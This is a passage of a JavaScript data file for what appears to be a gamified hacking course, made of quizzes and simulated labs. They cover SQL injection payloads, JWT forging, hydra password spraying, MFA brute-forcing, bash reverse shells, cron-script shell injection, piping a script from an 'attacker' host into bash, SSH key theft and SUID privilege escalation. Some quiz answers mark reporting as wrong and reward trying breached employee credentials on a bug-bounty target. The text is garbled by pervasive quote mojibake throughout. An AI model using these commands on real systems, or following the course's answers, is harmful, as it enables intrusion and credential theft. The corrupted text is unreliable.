{id:â€œi4mâ€,title:â€\uD83C\uDFC6 SQLi II Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œBlind SQLi is confirmed when:â€,opts:[â€œPage behavior changes based on injected true/false conditionsâ€,â€œYou see database errorsâ€,â€œThe page returns raw SQLâ€,â€œThe server crashesâ€],a:â€œPage behavior changes based on injected true/false conditionsâ€,why:â€œBoolean-based: true condition = one response, false condition = different response.â€},
{type:â€œtypeâ€,q:â€œTest for time-based blind SQLi:â€,a:[â€â€™ AND SLEEP(5)â€“â€,â€â€™ OR SLEEP(5)â€“â€],why:â€œIf the response is delayed, the database executed your SLEEP command.â€},
{type:â€œpickâ€,q:â€œSEL/**/ECT bypasses WAFs because:â€,opts:[â€œSQL ignores inline commentsâ€,â€œItâ€™s a different commandâ€,â€œThe comment encrypts itâ€,â€œIt uses a different protocolâ€],a:â€œSQL ignores inline commentsâ€,why:â€/**/ is a SQL comment. The database reads SEL + ECT = SELECT.â€},
{type:â€œtypeâ€,q:â€œList all database tables via injection:â€,a:[â€â€™ UNION SELECT table_name FROM information_schema.tablesâ€“â€,â€â€™ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tablesâ€“â€],why:â€œinformation_schema is the databaseâ€™s own map of all tables.â€}
]}
]},
{id:â€œi5â€,title:â€œAuth Attacksâ€,desc:â€œSessions, tokens, and password sprayingâ€,levels:[
{id:â€œi5l1â€,title:â€œSession & Token Attacksâ€,rounds:[
{type:â€œteachâ€,text:â€œWebsites track logins with session cookies or JWTs. Steal a session cookie = instant access. JWT (JSON Web Token) has 3 parts: header.payload.signature. If the signature isnâ€™t verified, you can forge tokens. Change â€˜userâ€™ to â€˜adminâ€™ in the payload.â€},
{type:â€œpickâ€,q:â€œWhat happens if you steal someoneâ€™s session cookie?â€,opts:[â€œYouâ€™re logged in as them instantlyâ€,â€œYou get their passwordâ€,â€œYou see their browsing historyâ€,â€œNothing, cookies expire immediatelyâ€],a:â€œYouâ€™re logged in as them instantlyâ€,why:â€œSession cookies ARE the login. No password needed.â€},
{type:â€œscenarioâ€,situation:â€œYou captured a JWT token. Decoded, the payload says {"user":"guest","role":"user"}. The algorithm is set to â€˜noneâ€™.â€,q:â€œWhat can you do?â€,opts:[â€œChange role to â€˜adminâ€™ and remove the signatureâ€,â€œNothing, JWTs are encryptedâ€,â€œBrute-force the passwordâ€,â€œOnly read the data, canâ€™t modifyâ€],a:â€œChange role to â€˜adminâ€™ and remove the signatureâ€,why:â€œAlgorithm â€˜noneâ€™ means no signature verification. You can freely modify the payload.â€}
]},
{id:â€œi5l2â€,title:â€œPassword Spraying & Credential Stuffingâ€,rounds:[
{type:â€œteachâ€,text:â€œPassword spraying: try ONE common password against MANY accounts (avoids lockout). Credential stuffing: use leaked username:password pairs from breaches. hydra does both: hydra -L users.txt -p â€˜Welcome1â€™ ssh://target.â€},
{type:â€œbuildâ€,q:â€œBuild a password spray against SSH:â€,parts:[â€œhydraâ€,â€-Lâ€,â€œusers.txtâ€,â€-pâ€,â€œWelcome1â€,â€œssh://targetâ€],answer:[â€œhydraâ€,â€-Lâ€,â€œusers.txtâ€,â€-pâ€,â€œWelcome1â€,â€œssh://targetâ€],why:â€-L = user list, -p = single password. Tries one password against all users.â€},
{type:â€œtypeâ€,q:â€œCredential stuff with a leaked combo list:â€,a:[â€œhydra -C creds.txt ssh://targetâ€,â€œhydra -C creds.txt ftp://targetâ€],why:â€-C takes user:pass combo file. Tests exact leaked credentials.â€}
]},
{id:â€œi5l3â€,title:â€œMulti-Factor Bypassâ€,rounds:[
{type:â€œteachâ€,text:â€œMFA isnâ€™t bulletproof. Common bypasses: brute-force 4-6 digit codes (only 10,000 combos), intercept SMS via SIM swap, steal backup codes from config files, exploit â€˜remember this deviceâ€™ tokens.â€},
{type:â€œpickâ€,q:â€œA 4-digit MFA code has how many possibilities?â€,opts:[â€œ10,000â€,â€œ1,000â€,â€œ100,000â€,â€œ1,000,000â€],a:â€œ10,000â€,why:â€œ0000-9999 = 10,000 combinations. Without rate limiting, trivially brute-forceable.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™ve compromised a userâ€™s password but they have MFA. You notice the MFA page doesnâ€™t rate-limit attempts.â€,q:â€œBest approach?â€,opts:[â€œBrute-force the 4-digit codeâ€,â€œGive up \u2014 MFA is unbreakableâ€,â€œTry social engineering the userâ€,â€œWait for the code to expireâ€],a:â€œBrute-force the 4-digit codeâ€,why:â€œWithout rate limiting, 10,000 attempts takes minutes with automation.â€}
]},
{id:â€œi5labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Breach CyberVaultâ€,rounds:[
{type:â€œlabâ€,title:â€œBreach CyberVaultâ€,objective:â€œChain multiple auth attacks to compromise CyberVaultâ€™s admin panel.â€,banner:â€œTarget: auth.cybervault.io\nYou have a list of employees.\nâ€,steps:[
{hint:â€œPassword spray the login with a common password.â€,accept:[â€œhydra -L users.txt -p â€˜Welcome1â€™ http-post-form://auth.cybervault.ioâ€,â€œ~hydraâ€,â€œ~sprayâ€],output:â€[22][ssh] host: auth.cybervault.io\nlogin: t.chen    password: Welcome1\nlogin: m.jones   password: Welcome1\n\n2 of 50 accounts compromised.â€,successMsg:â€œTwo accounts using â€˜Welcome1â€™. Weak password policy!â€,example:â€œhydra -L users.txt -p Welcome1 targetâ€,quickCmds:[â€œhydra -L users.txt -p Welcome1 targetâ€]},
{hint:â€œLogin as t.chen and check their access level.â€,accept:[â€œ~loginâ€,â€œ~curl.*loginâ€,â€œ~ssh t.chenâ€],output:â€œWelcome, Tina Chen\nRole: Standard User\nMFA: Enabled (SMS)\n\nDashboard shows: limited access, no admin panel.â€,successMsg:â€œStandard user with SMS-based MFA. Need to escalate.â€,example:â€œssh t.chen@auth.cybervault.ioâ€,quickCmds:[â€œssh t.chen@targetâ€]},
{hint:â€œCheck if m.jones has higher privileges.â€,accept:[â€œ~login.*jonesâ€,â€œ~ssh m.jonesâ€,â€œ~curl.*jonesâ€],output:â€œWelcome, Mike Jones\nRole: IT Administrator\nMFA: Enabled (4-digit PIN)\n\nAdmin panel visible! But MFA blocks access.â€,successMsg:â€œIT admin account! MFA uses only a 4-digit code.â€,example:â€œssh m.jones@auth.cybervault.ioâ€,quickCmds:[â€œssh m.jones@targetâ€]},
{hint:â€œThe MFA page has no rate limiting. Brute-force the 4-digit code.â€,accept:[â€œ~bruteâ€,â€œ~forceâ€,â€œ~python.*bruteâ€,â€œ~for.*0000.*9999â€],output:â€œAttempting 0000â€¦ failed\nAttempting 0001â€¦ failed\nâ€¦\nAttempting 4729â€¦ SUCCESS!\n\nAdmin panel unlocked!â€,successMsg:â€œMFA bypassed via brute-force. Full admin access achieved.â€,example:â€œpython3 brute_mfa.pyâ€,quickCmds:[â€œpython3 brute_mfa.pyâ€]}
]}
]},
{id:â€œi5mâ€,title:â€\uD83C\uDFC6 Auth Attacks Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œStealing a session cookie gives you:â€,opts:[â€œInstant login as that userâ€,â€œTheir plaintext passwordâ€,â€œAccess to their emailâ€,â€œTheir MFA codesâ€],a:â€œInstant login as that userâ€,why:â€œSession cookies ARE the authentication. No password needed.â€},
{type:â€œtypeâ€,q:â€œPassword spray SSH with â€˜Welcome1â€™:â€,a:[â€œhydra -L users.txt -p Welcome1 ssh://targetâ€,â€œhydra -L users.txt -p â€˜Welcome1â€™ ssh://targetâ€],why:â€-L = user list, -p = single password across all accounts.â€},
{type:â€œpickâ€,q:â€œJWT with algorithm set to â€˜noneâ€™ means:â€,opts:[â€œAnyone can forge the tokenâ€,â€œThe token is extra secureâ€,â€œThe token canâ€™t be decodedâ€,â€œThe token expires instantlyâ€],a:â€œAnyone can forge the tokenâ€,why:â€œNo signature verification = free to modify the payload.â€},
{type:â€œmatchâ€,q:â€œMatch the attack to its method:â€,pairs:[[â€œPassword sprayâ€,â€œ1 password \u2192 many accountsâ€],[â€œCredential stuffâ€,â€œLeaked combos \u2192 targetâ€],[â€œBrute-force MFAâ€,â€œTry all PIN codesâ€],[â€œSession hijackâ€,â€œSteal the cookieâ€]],why:â€œEach attack targets a different weakness in authentication systems.â€}
]}
]}
]};

var SEC8 = {
id:â€œs8â€,title:â€œExploitation IIâ€,tier:â€œintermediateâ€,icon:â€\uD83D\uDD25â€,color:â€œvar(â€“purple)â€,
units:[
{id:â€œi6â€,title:â€œAdvanced Shells & Pivotingâ€,desc:â€œReverse shells, port forwarding, and lateral movementâ€,levels:[
{id:â€œi6l1â€,title:â€œReverse Shell Techniquesâ€,rounds:[
{type:â€œteachâ€,text:â€œDifferent reverse shell payloads for different situations. Bash: bash -i >& /dev/tcp/IP/PORT 0>&1. Python: python3 -c â€˜import socket,os,pty;â€¦â€™. PHP: common for web shells. Always upgrade to a full TTY with python -c â€˜import pty;pty.spawn("/bin/bash")â€™.â€},
{type:â€œtypeâ€,q:â€œUpgrade a dumb shell to full TTY:â€,a:[â€œpython3 -c â€˜import pty;pty.spawn("/bin/bash")â€™â€,â€œpython -c â€˜import pty;pty.spawn("/bin/bash")â€™â€],why:â€œA full TTY lets you use sudo, clear screen, and tab-complete.â€},
{type:â€œpickâ€,q:â€œWhy upgrade a shell to TTY?â€,opts:[â€œTo use interactive commands like sudoâ€,â€œTo make the connection fasterâ€,â€œTo encrypt the trafficâ€,â€œTo bypass antivirusâ€],a:â€œTo use interactive commands like sudoâ€,why:â€œDumb shells canâ€™t handle interactive prompts. TTY fixes this.â€}
]},
{id:â€œi6l2â€,title:â€œPort Forwarding & Tunnelingâ€,rounds:[
{type:â€œteachâ€,text:â€œAfter compromising one machine, reach internal networks. SSH local forward: ssh -L 8080:internal:80 user@pivot \u2014 now localhost:8080 reaches the internal server. SSH dynamic proxy: ssh -D 9050 user@pivot creates a SOCKS proxy for all traffic.â€},
{type:â€œbuildâ€,q:â€œBuild an SSH tunnel to reach an internal web server:â€,parts:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],answer:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],why:â€-L local:remote:port forwards your 8080 through the pivot to internal 10.0.0.5:80.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™ve compromised a web server (10.10.10.44). It has a second NIC connected to 10.0.0.0/24 \u2014 an internal network you canâ€™t reach directly.â€,q:â€œHow do you scan the internal network?â€,opts:[â€œSSH tunnel through the compromised server as a pivotâ€,â€œScan from your machine directlyâ€,â€œAsk the client for VPN accessâ€,â€œUse a different exploitâ€],a:â€œSSH tunnel through the compromised server as a pivotâ€,why:â€œThe compromised server is your bridge. Route traffic through it to reach internal hosts.â€}
]},
{id:â€œi6l3â€,title:â€œLateral Movementâ€,rounds:[
{type:â€œteachâ€,text:â€œMove between machines using stolen credentials. Pass-the-Hash: use an NTLM hash directly without cracking it. psexec: remote execution on Windows. SSH key reuse: check ~/.ssh for keys that unlock other servers.â€},
{type:â€œtypeâ€,q:â€œCheck for SSH keys on a compromised Linux machine:â€,a:[â€œls -la ~/.ssh/â€,â€œcat ~/.ssh/id_rsaâ€,â€œls ~/.ssh/â€],why:â€œPrivate keys in .ssh/ might grant access to other servers.â€},
{type:â€œpickâ€,q:â€œPass-the-Hash means:â€,opts:[â€œUsing the hash directly to authenticate without crackingâ€,â€œForwarding traffic through a hash tableâ€,â€œEncrypting your traffic with the hashâ€,â€œA type of SQL injectionâ€],a:â€œUsing the hash directly to authenticate without crackingâ€,why:â€œWindows NTLM auth accepts the hash itself. No plaintext password needed.â€}
]},
{id:â€œi6labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Pivot Attackâ€,rounds:[
{type:â€œlabâ€,title:â€œPivot Attackâ€,objective:â€œCompromise a web server, pivot to the internal network, and reach the database.â€,banner:â€œEngagement: MegaCorp Internal\nInitial access: web-server (10.10.10.44)\nGoal: Reach DB server on internal network\nâ€,steps:[
{hint:â€œCheck the compromised serverâ€™s network interfaces.â€,accept:[â€œip addrâ€,â€œifconfigâ€,â€œ~ip aâ€],output:â€œeth0: 10.10.10.44/24  (external)\neth1: 10.0.0.1/24    (internal)\n\nTwo network interfaces!â€,successMsg:â€œDual-homed! eth1 connects to the internal 10.0.0.0/24 network.â€,example:â€œip addrâ€,quickCmds:[â€œip addrâ€]},
{hint:â€œScan the internal network from the compromised server.â€,accept:[â€œnmap -sn 10.0.0.0/24â€,â€œ~nmap.*10.0.0â€],output:â€œHost: 10.0.0.1  (this machine)\nHost: 10.0.0.50 (db-server)\nHost: 10.0.0.100 (file-share)â€,successMsg:â€œFound the database server at 10.0.0.50!â€,example:â€œnmap -sn 10.0.0.0/24â€,quickCmds:[â€œnmap -sn 10.0.0.0/24â€]},
{hint:â€œCheck for SSH keys that might access the DB server.â€,accept:[â€œls ~/.ssh/â€,â€œcat ~/.ssh/id_rsaâ€,â€œ~ls.*sshâ€,â€œ~cat.*sshâ€],output:â€-rwâ€”â€“â€“ 1 www-data www-data 1679 id_rsa\n-rw-râ€“râ€“ 1 www-data www-data  400 id_rsa.pub\n-rw-râ€“râ€“ 1 www-data www-data   89 known_hosts\n\nknown_hosts: 10.0.0.50 db-serverâ€,successMsg:â€œSSH key exists and the known_hosts confirms connection to db-server!â€,example:â€œls -la ~/.ssh/â€,quickCmds:[â€œls -la ~/.ssh/â€]},
{hint:â€œSSH into the database server using the key.â€,accept:[â€œssh -i ~/.ssh/id_rsa root@10.0.0.50â€,â€œ~ssh.*10.0.0.50â€,â€œssh root@10.0.0.50â€],output:â€œWelcome to db-server\nroot@db-server:~# whoami\nroot\n\nMySQL is running with root access.â€,successMsg:â€œRoot on the database server via key reuse. Full compromise!â€,example:â€œssh -i ~/.ssh/id_rsa root@10.0.0.50â€,quickCmds:[â€œssh -i ~/.ssh/id_rsa root@10.0.0.50â€]}
]}
]},
{id:â€œi6mâ€,title:â€\uD83C\uDFC6 Shells & Pivoting Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œUpgrade a dumb shell to full TTY:â€,a:[â€œpython3 -c â€˜import pty;pty.spawn("/bin/bash")â€™â€,â€œpython -c â€˜import pty;pty.spawn("/bin/bash")â€™â€],why:â€œFull TTY enables interactive commands.â€},
{type:â€œbuildâ€,q:â€œSSH tunnel to internal web server:â€,parts:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],answer:[â€œsshâ€,â€-Lâ€,â€œ8080:10.0.0.5:80â€,â€œuser@pivotâ€],why:â€œForwards your port 8080 through the pivot to internal server.â€},
{type:â€œpickâ€,q:â€œYou find SSH keys on a compromised server. You should:â€,opts:[â€œTry them on other internal serversâ€,â€œDelete them to cover tracksâ€,â€œIgnore them, theyâ€™re probably oldâ€,â€œReport them to the client immediatelyâ€],a:â€œTry them on other internal serversâ€,why:â€œSSH keys are reused constantly. Check known_hosts for targets.â€},
{type:â€œtypeâ€,q:â€œCheck for reusable SSH keys:â€,a:[â€œls -la ~/.ssh/â€,â€œcat ~/.ssh/id_rsaâ€,â€œls ~/.ssh/â€],why:â€œPrivate keys and known_hosts reveal lateral movement paths.â€}
]}
]},
{id:â€œi7â€,title:â€œAdvanced PrivEscâ€,desc:â€œSUID, cron, kernel exploits, and Docker breakoutâ€,levels:[
{id:â€œi7l1â€,title:â€œSUID & Capabilitiesâ€,rounds:[
{type:â€œteachâ€,text:â€œSUID binaries run as root regardless of who calls them. find / -perm -4000 lists all SUID files. GTFOBins shows which can be exploited. Capabilities are granular SUID: getcap -r / 2>/dev/null finds binaries with special powers like cap_setuid.â€},
{type:â€œtypeâ€,q:â€œFind all SUID binaries:â€,a:[â€œfind / -perm -4000 2>/dev/nullâ€,â€œfind / -perm -u=s 2>/dev/nullâ€,â€œfind / -perm -4000 -type f 2>/dev/nullâ€],why:â€œSUID files run as their owner (usually root). Any exploitable one = root.â€},
{type:â€œhackâ€,story:â€œYouâ€™re www-data on a CyberVault server. Time to escalate.â€,q:â€œSearch for SUID binaries that might give root.â€,a:[â€œfind / -perm -4000 2>/dev/nullâ€,â€œfind / -perm -u=s 2>/dev/nullâ€],output:â€/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/python3\n/usr/bin/mount\n/usr/bin/pkexecâ€,success:â€œpython3 has SUID! GTFOBins shows: python3 -c â€˜import os;os.execl("/bin/bash","bash","-p")â€™ gives root.â€,why:â€œSUID python = instant root. Itâ€™s like giving everyone a master key.â€}
]},
{id:â€œi7l2â€,title:â€œCron & Writable Scriptsâ€,rounds:[
{type:â€œteachâ€,text:â€œCron runs scripts on a schedule. If a cron job runs a script YOU can edit, you control what runs as root. Check: cat /etc/crontab, ls -la /etc/cron.d/, look for writable scripts in cron entries.â€},
{type:â€œtypeâ€,q:â€œCheck crontab for scheduled jobs:â€,a:[â€œcat /etc/crontabâ€,â€œcrontab -lâ€,â€œls /etc/cron.d/â€],why:â€œCron entries show what runs automatically and as which user.â€},
{type:â€œhackâ€,story:â€œYou found a cron job: * * * * * root /opt/scripts/cleanup.sh. The script is world-writable.â€,q:â€œInject a reverse shell into the writable cron script.â€,a:[â€œecho â€˜bash -i >& /dev/tcp/YOUR_IP/4444 0>&1â€™ >> /opt/scripts/cleanup.shâ€,â€œ~echo.*cleanupâ€,â€œ~bash.*cleanupâ€],output:â€$ echo â€˜bash -i >& /dev/tcp/10.10.14.5/4444 0>&1â€™ >> /opt/scripts/cleanup.sh\n$ nc -lvnp 4444\nListeningâ€¦\n[1 minute later]\nroot@target:~# whoami\nrootâ€,success:â€œCron ran your payload as root! Full root shell received.â€,why:â€œWorld-writable scripts in root cron jobs = guaranteed root access.â€}
]},
{id:â€œi7l3â€,title:â€œKernel & Docker Exploitsâ€,rounds:[
{type:â€œteachâ€,text:â€œKernel exploits: uname -r shows version, searchsploit finds exploits. DirtyPipe, DirtyCow are famous ones. Docker escape: if youâ€™re in a Docker container with â€“privileged, you can mount the host filesystem and escape.â€},
{type:â€œtypeâ€,q:â€œCheck kernel version for exploits:â€,a:[â€œuname -râ€,â€œuname -aâ€,â€œcat /proc/versionâ€],why:â€œExact kernel version lets you search for specific privilege escalation exploits.â€},
{type:â€œpickâ€,q:â€œA Docker container started with â€“privileged means:â€,opts:[â€œYou can escape to the host systemâ€,â€œIt runs with no network accessâ€,â€œItâ€™s completely isolatedâ€,â€œIt auto-updates dailyâ€],a:â€œYou can escape to the host systemâ€,why:â€â€“privileged gives the container full host device access. You can mount the host disk.â€}
]},
{id:â€œi7labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Root NovaTechâ€,rounds:[
{type:â€œlabâ€,title:â€œRoot NovaTechâ€,objective:â€œEscalate from www-data to root using multiple vectors.â€,banner:â€œConnected to novatech-web\n$ whoami\nwww-data\nGoal: Get root.\nâ€,steps:[
{hint:â€œRun linpeas to find all escalation vectors.â€,accept:[â€./linpeas.shâ€,â€œ~linpeasâ€,â€œcurl http://attacker/linpeas.sh | bashâ€],output:â€[+] SUID binaries:\n  /usr/bin/find (GTFOBins!)\n\n[+] Writable cron scripts:\n  /opt/backup/run.sh (runs as root every 5 min)\n\n[+] Kernel: 5.4.0-42 (DirtyPipe candidate)â€,successMsg:â€œThree vectors found! SUID find, writable cron, and old kernel.â€,example:â€./linpeas.shâ€,quickCmds:[â€./linpeas.shâ€]},
{hint:â€œUse the SUID find binary to get root.â€,accept:[â€œfind . -exec /bin/bash -p \;â€,â€œfind . -exec /bin/sh -p \;â€,â€œ~find.*exec.*bashâ€,â€œ~find.*exec.*shâ€],output:â€$ find . -exec /bin/bash -p \;\nbash-5.0# whoami\nroot\nbash-5.0# id\nuid=33(www-data) gid=33 euid=0(root)â€,successMsg:â€œRoot via SUID find! The -p flag preserves the elevated privileges.â€,example:â€œfind . -exec /bin/bash -p \;â€,quickCmds:[â€œfind . -exec /bin/bash -p \;â€]},
{hint:â€œRead the root flag.â€,accept:[â€œcat /root/flag.txtâ€,â€œ~cat /rootâ€,â€œ~cat.*flagâ€],output:â€œFLAG{novatech_rooted_2024}\n\nCongrats! Full system compromise achieved.â€,successMsg:â€œRoot flag captured! Engagement complete.â€,example:â€œcat /root/flag.txtâ€,quickCmds:[â€œcat /root/flag.txtâ€]}
]}
]},
{id:â€œi7mâ€,title:â€\uD83C\uDFC6 PrivEsc II Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œFind SUID binaries:â€,a:[â€œfind / -perm -4000 2>/dev/nullâ€,â€œfind / -perm -u=s 2>/dev/nullâ€],why:â€œSUID files run as owner. Exploitable ones = instant root.â€},
{type:â€œtypeâ€,q:â€œCheck crontab:â€,a:[â€œcat /etc/crontabâ€,â€œcrontab -lâ€],why:â€œCron jobs with writable scripts = root code execution.â€},
{type:â€œpickâ€,q:â€œA world-writable script in a root cron job means:â€,opts:[â€œAnyone can inject commands that run as rootâ€,â€œThe script canâ€™t be executedâ€,â€œOnly root can edit itâ€,â€œIt runs in a sandboxâ€],a:â€œAnyone can inject commands that run as rootâ€,why:â€œYou write the payload, cron executes it as root.â€},
{type:â€œtypeâ€,q:â€œCheck kernel version:â€,a:[â€œuname -râ€,â€œuname -aâ€,â€œcat /proc/versionâ€],why:â€œMatch the kernel version to known exploits like DirtyPipe.â€}
]}
]}
]};

// =============================================
// ADVANCED SECTION (7 units, 35 levels)
// Short reads, straight into labs. Independence.
// =============================================

var SEC9 = {
id:â€œs9â€,title:â€œAdvanced Terminal & Reconâ€,tier:â€œadvancedâ€,icon:â€\uD83D\uDC27â€,color:â€œvar(â€“green)â€,
units:[
{id:â€œa1â€,title:â€œRecon Automationâ€,desc:â€œScript your own recon pipelineâ€,levels:[
{id:â€œa1l1â€,title:â€œBuilding Recon Scriptsâ€,rounds:[
{type:â€œteachâ€,text:â€œReal pentesters chain tools into scripts. A basic recon script: run whois, dig, subfinder, httpx, then nmap. Pipe output between tools and save to files. Automate what youâ€™d do manually.â€},
{type:â€œtypeâ€,q:â€œRun subfinder to enumerate subdomains and pipe to httpx:â€,a:[â€œsubfinder -d target.com | httpxâ€,â€œsubfinder -d target.com -silent | httpxâ€],why:â€œsubfinder finds subdomains, httpx checks which are live.â€},
{type:â€œhackâ€,story:â€œYouâ€™re starting a bug bounty on Apex Financial. Automate your initial recon.â€,q:â€œChain subfinder and httpx to find live subdomains.â€,a:[â€œsubfinder -d apex.com | httpxâ€,â€œsubfinder -d apex.com -silent | httpx -silentâ€],output:â€œhttps://portal.apex.com [200]\nhttps://api.apex.com [200]\nhttps://staging.apex.com [200]\nhttps://dev-internal.apex.com [403]\nhttps://legacy.apex.com [200]â€,success:â€œ5 live subdomains. staging and dev-internal are high-value targets.â€,why:â€œAutomation finds more targets faster than manual enumeration.â€}
]},
{id:â€œa1l2â€,title:â€œCustom Wordlistsâ€,rounds:[
{type:â€œteachâ€,text:â€œGeneric wordlists miss target-specific paths. cewl scrapes a website to build custom wordlists from its own content. Combine with industry-specific terms. Better wordlists = more findings.â€},
{type:â€œtypeâ€,q:â€œGenerate a custom wordlist from a target website:â€,a:[â€œcewl http://target.com -w custom.txtâ€,â€œcewl http://target.com -d 2 -w custom.txtâ€],why:â€œcewl crawls the site and extracts words for a targeted wordlist.â€},
{type:â€œhackâ€,story:â€œApex Financialâ€™s login uses employee IDs. Scrape their site for potential usernames.â€,q:â€œUse cewl to build a wordlist from the Apex website.â€,a:[â€œcewl http://apex.com -w apex_words.txtâ€,â€œcewl apex.com -w apex_words.txtâ€,â€œ~cewl.*apexâ€],output:â€œCeWL 5.5.2 - Words: 847\nSaved to: apex_words.txt\n\nTop words: apex, financial, portal, investor,\njohnson, chen, williams, quarterly, dividendsâ€,success:â€œEmployee names in the wordlist! johnson, chen, williams could be usernames.â€,why:â€œCompany websites often leak employee names, product terms, and internal jargon.â€}
]},
{id:â€œa1labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Automated Reconâ€,rounds:[
{type:â€œlabâ€,title:â€œAutomated Reconâ€,objective:â€œRun a full automated recon pipeline against Apex Financial.â€,banner:â€œBug Bounty: Apex Financial\nScope: *.apex.com\nGo.\nâ€,steps:[
{hint:â€œEnumerate subdomains.â€,accept:[â€œsubfinder -d apex.comâ€,â€œ~subfinderâ€,â€œ~sublist3râ€,â€œamass enum -d apex.comâ€],output:â€œportal.apex.com\napi.apex.com\nstaging.apex.com\ndev-internal.apex.com\nlegacy.apex.com\nbackup.apex.com\nmail.apex.comâ€,successMsg:â€œ7 subdomains found.â€,example:â€œsubfinder -d apex.comâ€,quickCmds:[â€œsubfinder -d apex.comâ€]},
{hint:â€œCheck which are live with httpx.â€,accept:[â€œ~httpxâ€,â€~| httpxâ€,â€œcat subs.txt | httpxâ€],output:â€œhttps://portal.apex.com [200] [Login Portal]\nhttps://api.apex.com [200] [API v2]\nhttps://staging.apex.com [200] [Staging]\nhttps://legacy.apex.com [200] [Apex Legacy]\nhttps://backup.apex.com [403] [Forbidden]â€,successMsg:â€œ5 live, 1 forbidden. Legacy and staging are juicy.â€,example:â€œcat subs.txt | httpxâ€,quickCmds:[â€œcat subs.txt | httpxâ€]},
{hint:â€œRun nuclei vulnerability scanner against live hosts.â€,accept:[â€œnuclei -l live.txtâ€,â€œ~nucleiâ€,â€œnuclei -u https://staging.apex.comâ€],output:â€[critical] CVE-2024-1234 on staging.apex.com\n[high] exposed-git on legacy.apex.com/.git\n[medium] cors-misconfiguration on api.apex.com\n[info] tech-detect WordPress on legacy.apex.comâ€,successMsg:â€œCritical CVE on staging, exposed .git on legacy! Multiple findings.â€,example:â€œnuclei -l live.txtâ€,quickCmds:[â€œnuclei -l live.txtâ€]},
{hint:â€œDownload the exposed git repository.â€,accept:[â€œgit-dumper https://legacy.apex.com/.git ./dumpâ€,â€œ~git-dumperâ€,â€œ~git.*dumpâ€,â€œwget -r https://legacy.apex.com/.gitâ€],output:â€œDownloading objectsâ€¦ 100%\nExtracted 234 files\n\nFound: config/database.yml\n  production:\n    password: Ap3x_Pr0d_2024!â€,successMsg:â€œProduction database password from the git repo! Critical finding.â€,example:â€œgit-dumper https://legacy.apex.com/.git dumpâ€,quickCmds:[â€œgit-dumper https://legacy.apex.com/.git dumpâ€]}
]}
]},
{id:â€œa1lab2â€,title:â€\uD83D\uDDA5\uFE0F Lab: OSINT Deep Diveâ€,rounds:[
{type:â€œlabâ€,title:â€œOSINT Deep Diveâ€,objective:â€œGather intelligence on Apex Financial without touching their servers.â€,banner:â€œPassive Recon Only\nTarget: Apex Financial (apex.com)\nDo NOT touch their infrastructure.\nâ€,steps:[
{hint:â€œCheck DNS records for mail and other services.â€,accept:[â€œdig apex.com ANYâ€,â€œdig apex.com mxâ€,â€œ~dig.*apexâ€,â€œnslookup apex.comâ€],output:â€œMX: mail.apex.com -> 10.50.1.10\nTXT: v=spf1 include:_spf.google.com ~all\nNS: ns1.cloudflare.com\nA: 104.21.45.67 (Cloudflare)â€,successMsg:â€œThey use Google Workspace for email and Cloudflare for CDN.â€,example:â€œdig apex.com ANYâ€,quickCmds:[â€œdig apex.com ANYâ€]},
{hint:â€œSearch for leaked credentials on breach databases.â€,accept:[â€œ~breachâ€,â€œ~leakâ€,â€œ~haveibeenpwnedâ€,â€œtheHarvester -d apex.com -b allâ€],output:â€œtheHarvester results:\n  Emails: ceo@apex.com, admin@apex.com, t.chen@apex.com\n  Hosts: portal.apex.com, vpn.apex.com\n  Breaches: 3 apex.com emails found in 2023 LinkedIn breachâ€,successMsg:â€œ3 employee emails in a breach! Those credentials may still work.â€,example:â€œtheHarvester -d apex.com -b allâ€,quickCmds:[â€œtheHarvester -d apex.com -b allâ€]},
{hint:â€œCheck their SSL certificate for additional subdomains.â€,accept:[â€œ~crt.shâ€,â€œ~sslâ€,â€œ~certâ€,â€œcurl â€˜https://crt.sh/?q=apex.comâ€™â€],output:â€œcrt.sh results:\n  *.apex.com\n  portal.apex.com\n  vpn.apex.com\n  jira.apex.com\n  confluence.apex.com\n  gitlab.apex.comâ€,successMsg:â€œInternal tools exposed: Jira, Confluence, GitLab. Huge attack surface.â€,example:â€œcurl â€˜https://crt.sh/?q=apex.comâ€™â€,quickCmds:[â€œcurl â€˜https://crt.sh/?q=apex.comâ€™â€]}
]}
]},
{id:â€œa1mâ€,title:â€\uD83C\uDFC6 Recon III Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œEnumerate subdomains and check which are live:â€,a:[â€œsubfinder -d target.com | httpxâ€,â€œsubfinder -d target.com -silent | httpxâ€],why:â€œChain tools: find subdomains then verify theyâ€™re up.â€},
{type:â€œtypeâ€,q:â€œBuild a custom wordlist from a target site:â€,a:[â€œcewl http://target.com -w custom.txtâ€,â€œcewl http://target.com -d 2 -w custom.txtâ€],why:â€œTarget-specific wordlists find what generic ones miss.â€},
{type:â€œpickâ€,q:â€œAn exposed .git directory lets you:â€,opts:[â€œDownload source code and find secretsâ€,â€œSee live trafficâ€,â€œAccess the admin panelâ€,â€œCrash the serverâ€],a:â€œDownload source code and find secretsâ€,why:â€œGit repos contain full source code, config files, and hardcoded credentials.â€},
{type:â€œscenarioâ€,situation:â€œYou found 3 employee emails in a data breach from 2023. The company hasnâ€™t enforced password resets.â€,q:â€œNext step?â€,opts:[â€œTry the breached credentials on login portalsâ€,â€œReport to the company immediatelyâ€,â€œIgnore it, old breaches donâ€™t matterâ€,â€œScan their network aggressivelyâ€],a:â€œTry the breached credentials on login portalsâ€,why:â€œPeople reuse passwords. Breached creds from 2023 might still work in 2025.â€}
]}
]}
]};

var SEC10 = {
id:â€œs10â€,title:â€œAdvanced Web Attacksâ€,tier:â€œadvancedâ€,icon:â€\u26A1â€,color:â€œvar(â€“red)â€,
units:[
